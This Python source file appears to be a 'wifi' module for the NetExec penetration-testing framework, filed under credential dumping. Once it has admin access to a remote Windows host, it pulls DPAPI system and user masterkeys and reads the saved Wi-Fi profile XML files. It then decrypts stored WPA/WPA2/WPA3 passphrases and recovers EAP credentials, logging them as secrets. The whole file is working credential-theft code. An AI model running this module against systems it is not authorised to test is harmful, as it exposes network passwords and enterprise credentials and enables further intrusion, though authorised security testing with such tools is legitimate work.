import ntpath
from binascii import unhexlify
from dataclasses import dataclass, field

from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.triage.wifi import WifiTriage
from lxml import etree

from nxc.helpers.misc import CATEGORY
from nxc.helpers.wifi_eap import recover_eap_credentials
from nxc.playbooks.results import ActionResult, ResultStatus


class NXCModule:
    name = "wifi"
    description = "Get key of all wireless interfaces"
    supported_protocols = ["smb", "wmi", "winrm", "mssql"]
    category = CATEGORY.CREDENTIAL_DUMPING

    @dataclass
    class ResultData:
        masterkey_count: int = 0
        profiles: list[dict] = field(default_factory=list)
        enumeration_complete: bool = False
        user_masterkeys_collected: bool = False

    result_type = ResultData

    def options(self, context, module_options):
        """No options available"""

    def on_admin_login(self, context, connection):
        data = self.ResultData()
        errors = []
        try:
            masterkeys = list(connection.dpapi_triage.collect_masterkeys_from_target(dump_users=False, dump_system=True))
            data.masterkey_count = len(masterkeys)
            triage = WifiTriage(target=connection.dpapi_triage.target, conn=connection.dpapi_triage.conn, masterkeys=masterkeys)
            interfaces = triage.conn.list_dir(share=triage.share, path=triage.system_wifi_generic_path)
            if interfaces is None:
                raise RuntimeError("Wi-Fi interface listing unavailable")
            for interface in interfaces:
                if not interface.is_directory() or interface.get_longname() in triage.false_positive:
                    continue
                interface_path = ntpath.join(triage.system_wifi_generic_path, interface.get_longname())
                files = triage.conn.list_dir(share=triage.share, path=interface_path)
                if files is None:
                    raise RuntimeError(f"Wi-Fi profile listing unavailable: {interface_path}")
                for file in files:
                    name = file.get_longname()
                    if file.is_directory() or not name.lower().endswith(".xml"):
                        continue
                    record = {"interface": interface.get_longname(), "path": ntpath.join(interface_path, name), "xml": None,
                              "ssid": None, "authentication": None, "encryption": None, "password": None,
                              "eap_credentials": None, "eap_lookup_status": "not_requested", "eap_observation": None, "error": None}
                    data.profiles.append(record)
                    try:
                        record["xml"] = triage.conn.read_file(share=triage.share, path=record["path"], looted_files=triage.looted_files)
                        if record["xml"] is None:
                            raise RuntimeError("Wi-Fi profile could not be read")
                        root = etree.fromstring(record["xml"])
                        record["ssid"] = self.xml_text(root, "SSIDConfig/SSID/name")
                        record["authentication"] = self.xml_text(root, "MSM/security/authEncryption/authentication")
                        record["encryption"] = self.xml_text(root, "MSM/security/authEncryption/encryption")
                        if record["authentication"] in ("WPAPSK", "WPA2PSK", "WPA3SAE"):
                            material = self.xml_text(root, "MSM/security/sharedKey/keyMaterial")
                            if self.xml_text(root, "MSM/security/sharedKey/protected").lower() == "false":
                                record["password"] = material
                            else:
                                blob = unhexlify(material)
                                key = find_masterkey_for_blob(blob, masterkeys=masterkeys)
                                if key is None:
                                    raise RuntimeError("No matching masterkey for Wi-Fi profile")
                                cleartext = decrypt_blob(blob, masterkey=key)
                                if cleartext is None:
                                    raise RuntimeError("Wi-Fi profile decryption failed")
                                record["password"] = cleartext.removesuffix(b"\x00")
                        elif record["authentication"] in ("WPA", "WPA2"):
                            if not data.user_masterkeys_collected:
                                triage.masterkeys.extend(connection.dpapi_triage.collect_masterkeys_from_target(dump_users=True, dump_system=False))
                                data.user_masterkeys_collected = True
                                data.masterkey_count = len(triage.masterkeys)
                            observation = {}
                            record["eap_observation"] = observation
                            try:
                                record["eap_credentials"] = recover_eap_credentials(triage, name[:-4], observation)
                            finally:
                                record["eap_lookup_status"] = observation.get("status", "failed")
                                record["eap_credentials"] = observation.get("credentials")
                        context.log.highlight(f"[{record['authentication']}] {record['ssid']}")
                        if record["password"] is not None:
                            connection.dpapi_triage.log_secret(f"Passphrase: {record['password']}", logger=context.log)
                        if record["eap_credentials"] is not None:
                            connection.dpapi_triage.log_secret(str(record["eap_credentials"]), logger=context.log)
                    except Exception as e:
                        record["error"] = str(e) or type(e).__name__
                        raise
            data.enumeration_complete = True
        except Exception as e:
            errors.append(str(e) or type(e).__name__)
            context.log.fail(errors[-1])
        return ActionResult(connection.args.protocol, self.name, connection.host, ResultStatus.FAILED if errors else ResultStatus.SUCCESS if data.profiles else ResultStatus.NEGATIVE, data, error="; ".join(errors) or None)

    def xml_text(self, root, path):
        values = root.xpath("./" + "/".join(f"*[local-name()='{part}']" for part in path.split("/")) + "/text()")
        if not values:
            raise ValueError(f"Wi-Fi profile is missing {path}")
        return values[0]
